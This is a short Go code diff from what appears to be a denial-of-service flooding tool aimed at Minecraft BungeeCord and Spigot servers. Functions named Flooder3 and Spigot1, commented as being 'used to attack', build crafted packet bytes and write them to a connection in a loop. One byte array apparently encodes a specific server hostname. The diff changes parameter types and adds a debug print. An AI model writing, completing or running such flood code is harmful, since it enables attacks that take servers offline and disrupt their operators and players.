@@ -59,12 +59,14 @@ func Extreme1(data *MethodData, out net.Conn) {
 }
 
 // Flooder3 is used to attack BungeeCord
-func Flooder3(data MethodData, out net.Conn) {
+func Flooder3(data *MethodData, out net.Conn) {
 	if data.bytes == nil {
 		data.bytes = makeBytes(0, 47, 20, 109, data.Address, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, -35, 2)
 		data.one = makeBytes(1)
 		data.zero = makeBytes(0)
 	}
+
+	fmt.Println("sent")
 
 	for i := 0; i < data.Loop; i++ {
 		out.Write(data.bytes)
@@ -77,7 +79,7 @@ func Flooder3(data MethodData, out net.Conn) {
 }
 
 // Spigot1 is for spigot o_O
-func Spigot1(data MethodData, out net.Conn) {
+func Spigot1(data *MethodData, out net.Conn) {
 	if data.bytes == nil {
 		data.bytes = makeBytes(15, 0, 47, 9, data.Address, 99, 224, 1)
 		data.one = makeBytes(1)
